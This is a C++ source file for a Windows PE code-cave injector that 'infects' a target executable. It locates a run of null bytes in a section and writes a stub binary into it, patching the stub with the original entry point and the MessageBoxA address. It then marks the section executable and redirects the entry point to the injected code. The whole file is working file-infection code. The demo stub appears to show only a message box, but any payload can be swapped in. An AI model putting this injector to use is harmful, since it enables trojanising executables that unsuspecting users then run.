#include "everything.h"

using namespace std;

int main(int argc, char** argv) {
	if (argc < 2)
		ReportError("Usage: sectionAppender.exe <exe file>", 1, false);

	if (!isFileGood(argv[1]))
		ReportError("Unable to open file for parsing", 1, false);

	char* filename = argv[1];
	Binary PeBinary;
	/* Open stub binary */
	HANDLE hStub = CreateFile("newstub.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hStub == INVALID_HANDLE_VALUE)
		ReportError("Cannot open stub binary", 1, false);
	DWORD StubSize = GetFileSize(hStub, NULL);
	LPBYTE StubBuffer = (LPBYTE)malloc(StubSize);
	DWORD szCheck;
	ReadFile(hStub, StubBuffer, StubSize, &szCheck, NULL);
	if (szCheck != StubSize)
		ReportError("Cannot read stub binary", 1, false);
	CloseHandle(hStub);
	/* Initialize victim pe */
	PeBinary.initBinary(filename);
	PeBinary.loadHeaders();
	/* Scan for cavity */
	PIMAGE_SECTION_HEADER caveSection = NULL;
	DWORD writeOffset = 0;
	BOOL found = false;
	for (int idx = 0; !found && idx < PeBinary.FileHeader->NumberOfSections; idx++) {
		caveSection = &PeBinary.SectionHeaders[idx];
		writeOffset = caveSection->PointerToRawData;
		for (DWORD count = 0, i = 0; !found &&  i < caveSection->SizeOfRawData; i++) {
			if ((LPBYTE) PeBinary.pFile[writeOffset + i] == 0x00) {
				if (count++ == StubSize) {
					writeOffset += i;
					found = true;
					printf("[+] Code cave located @ 0x%08lX\n", writeOffset);
				}
			}
			else count = 0;
		}
	}


	if (!found)
		ReportError("Cannot find code cave", 1, false);


	/* Try to get addresses to fill in stub */
	HMODULE hUSER32 = LoadLibrary("user32.dll");
	DWORD OEP = PeBinary.OptionalHeader->AddressOfEntryPoint + PeBinary.OptionalHeader->ImageBase;
	FARPROC MessageBoxAddr = GetProcAddress(hUSER32, "MessageBoxA");
	/* Prepare the stub*/
	DWORD OEPFilter = 0xBBBBBBBB, MessageBoxFilter = 0xAAAAAAAA;
	BOOL OEP_patched = false, MessageBox_patched = false;

	for (int idx = 0; idx < StubSize; idx++) {
		DWORD value = *(reinterpret_cast<LPDWORD>(StubBuffer + idx));
		if (value == OEPFilter) {
			OEP_patched = true;
			*(reinterpret_cast<LPDWORD>(StubBuffer + idx)) = OEP;
		}
		else if (value == MessageBoxFilter) {
			*(reinterpret_cast<LPDWORD>(StubBuffer + idx)) = (DWORD)MessageBoxAddr;
			MessageBox_patched = true;
		}
	}

	if (!(OEP_patched & MessageBox_patched))
		ReportError("Cannot patch address of stub", 1, false);

	/* Infection */
	memcpy(&PeBinary.pFile[writeOffset], StubBuffer, StubSize);
	// Add execute flag, adjust virtual size & change OEP
	caveSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
	caveSection->Misc.VirtualSize += StubSize;
	PeBinary.OptionalHeader->AddressOfEntryPoint = PeBinary.RawToRVA(writeOffset);
	// Write to disk
	FlushViewOfFile(PeBinary.pFile, 0);
	/* Cleanup */
	free(StubBuffer);
	PeBinary.~Binary();
	return 0;
}


